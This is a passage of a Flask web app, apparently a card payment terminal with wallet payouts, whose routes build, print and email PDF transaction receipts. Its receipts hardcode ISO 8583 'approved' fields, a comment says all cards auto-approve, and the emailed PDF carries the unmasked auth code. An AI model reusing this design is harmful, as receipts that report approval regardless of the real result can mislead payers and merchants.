                f"receipt_{session.get('txn_id')}.pdf",
                "application/pdf",
                pdf_bytes
            )
            
            mail.send(msg)
            _mail_save_copy_to_sent_folder(msg)
            logging.info(f"Receipt email with PDF sent automatically to {recipient_email}")
        except Exception as e:
            logging.exception("Failed to send automatic receipt email")
            # Don't fail the success page if email fails
    else:
        logging.info("Skipping automatic receipt email: missing recipient or mail config")
    
    return render_template('success.html',
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan", "")[-4:],
        amount=session.get("amount"),
        timestamp=session.get("timestamp")
    )

@app.route("/receipt")
def receipt():
    raw_protocol = session.get("protocol", "")
    match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
    if match:
        protocol_version = match.group(1)
        auth_digits = int(match.group(2))
    else:
        protocol_version = "Unknown"
        auth_digits = 4

    raw_amount = session.get("amount", "0")
    try:
        # try parse as Decimal for nicer formatting
        amt = Decimal(str(raw_amount))
        amount_fmt = f"{amt:,.2f}"
    except (InvalidOperation, TypeError):
        amount_fmt = "0.00"

    # Determine how to mask the auth code:
    stored_auth = session.get("auth_code", "")
    if stored_auth:
        auth_mask = "*" * len(stored_auth)
    else:
        auth_mask = "*" * auth_digits

    # Choose wallet image based on payout type (resolves actual filename on disk for case-sensitive hosts)
    payout_type = (session.get("payout_type") or "").strip().upper()
    wallet_image = _wallet_image_filename(session.get("payout_type"))
    logging.info(f"Receipt payout_type: '{payout_type}', wallet_image: {wallet_image}")

    # Show OFFLINE on receipt when using offline protocol, otherwise masked server ID
    if session.get("offline"):
        server_id = "OFFLINE"
    else:
        server_id = _mask_receipt_server_id(_get_receipt_server_id())
    return render_template("receipt.html",
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan")[-4:] if session.get("pan") else "",
        amount=amount_fmt,
        payout=session.get("payout_type"),
        wallet=session.get("wallet"),
        wallet_image=wallet_image,
        auth_code=auth_mask,
        email=_mask_email_for_receipt(session.get("email")),
        iso_field_18="5999",                # Default MCC
        iso_field_25="00",                  # POS condition
        field39="00",                       # ISO8583 Field 39 (approved)
        card_type=session.get("card_type", "VISA"),
        protocol_version=protocol_version,
        timestamp=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        server_id=server_id
    )

@app.route('/receipt_print')
@login_required
def receipt_print():
    """Printable version of receipt that triggers browser print"""
    if session.get("offline"):
        server_id = "OFFLINE"
    else:
        server_id = _mask_receipt_server_id(_get_receipt_server_id())
    return render_template("receipt_print.html",
        txn_id=session.get("txn_id"),
        arn=session.get("arn"),
        pan=session.get("pan")[-4:] if session.get("pan") else "",
        amount=session.get("amount"),
        payout=session.get("payout_type"),
        wallet=session.get("wallet"),
        auth_code=session.get("auth_code", "****"),
        email=_mask_email_for_receipt(session.get("email")),
        iso_field_18="5999",
        iso_field_25="00",
        field39="00",
        card_type=session.get("card_type", "VISA"),
        protocol_version=session.get("protocol", ""),
        timestamp=session.get("timestamp", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        server_id=server_id
    )

@app.route('/send-receipt-email', methods=['POST'])
def send_receipt_email():
    """Send receipt via email with PDF attachment - using screenshot for accurate rendering"""
    recipient_email = request.form.get('email', '').strip()
    
    # Validate email format
    if not recipient_email or '@' not in recipient_email:
        return jsonify({'success': False, 'error': 'Invalid email address'}), 400
    
    # Check if we have email configuration
    if not app.config['MAIL_USERNAME'] or not app.config['MAIL_PASSWORD']:
        return jsonify({'success': False, 'error': 'Email service not configured'}), 500

    logging.info("Preparing manual receipt email for %s", recipient_email)
    
    try:
        # Prepare receipt data
        raw_protocol = session.get("protocol", "")
        match = re.search(r"-(\d+\.\d+)\s+\((\d+)-digit", raw_protocol)
        if match:
            protocol_version = match.group(1)
            auth_digits = int(match.group(2))
        else:
            protocol_version = "Unknown"
            auth_digits = 4
        
        raw_amount = session.get("amount", "0")
        try:
            amt = Decimal(str(raw_amount))
            amount_fmt = f"{amt:,.2f}"
        except (InvalidOperation, TypeError):
            amount_fmt = "0.00"
        
        # Get actual auth code (not masked)
        auth_code = session.get("auth_code", "")
        if not auth_code:
            auth_code = "*" * auth_digits
        
        # Determine wallet image
        payout_type = (session.get("payout_type") or "").strip().upper()
        wallet_image = _wallet_image_filename(session.get("payout_type"))

        # Set server/connection indicator for PDF receipt (OFFLINE vs masked server ID)
        if session.get("offline"):
            server_id = "OFFLINE"
        else:
            server_id = _get_receipt_server_id()
        pdf_bytes = _build_receipt_pdf_bytes(
            txn_id=session.get('txn_id'),
            arn=session.get('arn'),
            pan_last4=session.get("pan")[-4:] if session.get("pan") else "",
            amount=amount_fmt,
            payout_type=session.get("payout_type"),
            wallet=session.get("wallet"),
            auth_code=auth_code,
            timestamp=session.get("timestamp"),
            server_id=server_id
        )
        
        # Create email message
        subject = f"NJAKAM LIMITED Receipt - Transaction {session.get('txn_id')}"
        body, html_body = _receipt_email_plain_and_html(
            session.get('txn_id'), amount_fmt, session.get('timestamp')
        )
        msg = Message(
            subject=subject,
            recipients=[recipient_email],
            body=body,
            html=html_body,
            sender=app.config['MAIL_DEFAULT_SENDER']
        )
        
        # Attach PDF receipt
        msg.attach(
            f"receipt_{session.get('txn_id')}.pdf",
            "application/pdf",
            pdf_bytes
        )
        
        mail.send(msg)
        _mail_save_copy_to_sent_folder(msg)
        logging.info(f"Receipt email with PDF sent successfully to {recipient_email}")
        return jsonify({'success': True, 'message': 'Receipt sent successfully'}), 200
    
    except Exception as e:
        logging.exception("Failed to send receipt email")
        return jsonify({'success': False, 'error': f'Failed to send email: {str(e)}'}), 500

@app.route('/rejected')
def rejected():
    # Kept for compatibility but rarely used now that all cards auto-approve.
    return render_template('rejected.html',
        code=request.args.get("code", "XX"),
        reason=request.args.get("reason", "Transaction Declined")
    )

@app.route("/licence")
def licence():
    return render_template("licence.html")

@app.route('/offline')
def offline():
    """Public page so the service worker can cache it for offline fallback (no login redirect)."""
    return render_template('offline.html')


@app.route('/service-worker.js')
def service_worker():
    """Serve SW from site root so scope is `/`, not `/static/` only."""
    sw_path = os.path.join(app.root_path, 'static', 'service-worker.js')
    return send_file(sw_path, mimetype='application/javascript')


@app.route('/.well-known/assetlinks.json')
def assetlinks():
    assetlinks_path = os.path.join(app.root_path, 'static', '.well-known', 'assetlinks.json')
    return send_file(assetlinks_path, mimetype='application/json')

@app.route('/manifest.json')
def manifest():
    manifest_path = os.path.join(app.root_path, 'static', 'manifest.json')
    return send_file(manifest_path, mimetype='application/json')

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
